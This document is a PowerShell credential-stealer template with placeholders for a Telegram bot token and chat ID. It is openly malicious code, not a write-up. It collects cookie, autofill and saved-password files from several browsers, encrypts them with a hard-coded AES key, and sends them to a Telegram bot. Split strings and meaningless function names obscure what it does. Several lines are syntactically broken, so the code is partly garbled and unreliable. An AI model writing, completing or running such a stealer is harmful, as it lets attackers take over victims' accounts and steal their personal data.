$A1 = \"{token}\"
$B2 = \"{chat_id}\"

Function Zz {{
    param ([string]$D1, [string]$K1 = \"MySuperSecretKey123456\")
    $C1 = New-Object System.Security.Cryptography.AesManaged
    $C1.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $C1.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $C1.Key = [System.Text.Encoding]::UTF8.GetBytes($K1.PadRight(32, '0'))
    $C1.GenerateIV()
    $E1 = $C1.CreateEncryptor()
    $B1 = [System.Text.Encoding]::UTF8.GetBytes($D1)
    $F1 = $E1.TransformFinalBlock($B1, 0, $B1.Length)
    $M1 = New-Object System.IO.MemoryStream
    $M1.Write($C1.IV, 0, $C1.IV.Length)
    $M1.Write($F1, 0, $F1.Length)
    $R1 = $M1.ToArray()
    [Convert]::ToBase64String($R1)
}}

Function Xx {{
    $P1 = @(
        "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies",
        "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cookies",
        "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
        "$env:APPDATA\\Opera Software\\Opera GX Stable\\Cookies",
        $env:LOCALAPPDATA\\Vivaldi\\User Data\\Default\\Cookies,
        $env:LOCALAPPDATA\\Chromium\\User Data\\Default\\Cookies
        
#AF

        $env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Web Data,
        $env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Web Data,
        $env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Web Data,
        $env:APPDATA\\Opera Software\\Opera GX Stable\\Web Data,
        $env:APPDATA\\Opera Software\\Opera Stable\\Web Data,
      	$env:LOCALAPPDATA\\Chromium\\User Data\\Default\\Web Data
        $env:LOCALAPPDATA\\Vivaldi\\User Data\\Default\\Web Data    
        $env:LOCALAPPDATA\\Chromium\\User Data\\Default\\Web Data
  
#PW
    
        $env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data
        $env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data
        $env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data
        $env:LOCALAPPDATA\\Opera Software\\Opera Stable\\Login Data
        $env:LOCALAPPDATA\\Vivaldi\\User Data\\Default\\Login Data
        $env:LOCALAPPDATA\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data
        $env:LOCALAPPDATA\\Chromium\\User Data\\Default\\Login Data    
  
    )
    $Zz = \"\"

    foreach ($Q1 in $P1) {{
        if (Test-Path $Q1) {{
            try {{
                $Zz += ('='*3) + $Q1 + "`n"
                $D2 = [System.IO.File]::ReadAllBytes($Q1)
                if ($D2.Length -gt 4000) {{
        $Zz += "Data too large to send, skipping..." + "`n"
}} else {{
        $Zz += [Convert]::ToBase64String($D2) + "`n"
}}
            catch {{
                $Zz += ("err@:" + $Q1 + " - " + $_.Exception.Message + "`n") 
}}
            }}
        }}
    }}
    return $Zz
}}

Function Yy {{
    param ([string]$Msg)
    $b64 = 'aHR0cHM6Ly9hcGku' + 'dGVsZWdyYW0ub3Jn' + '/Ym90'
    $url = [https://api.telegram.org/bot$.../sendMessage]::UTF8.GetString(...)

    $body = @{{ 
        ('c'+'hat_id') = $B2
        ('te'+'xt') = $Msg
        ('pars'+'e_mode') = \"Markdown\"
    }}

    $IR = ('In'+'voke') + '-RestMethod'
    $response = &($IR) -Uri $uri -Method Post -Body $body
if ($response.ok -eq $false) {{
    Write-Host "Failed to send message: $($response.description)"
}}
}}

# Entry Point
$DUMP = Xx
$ENC = Zz -D1 $DUMP
Yy -Msg ('Result:`n`n' + $ENC)
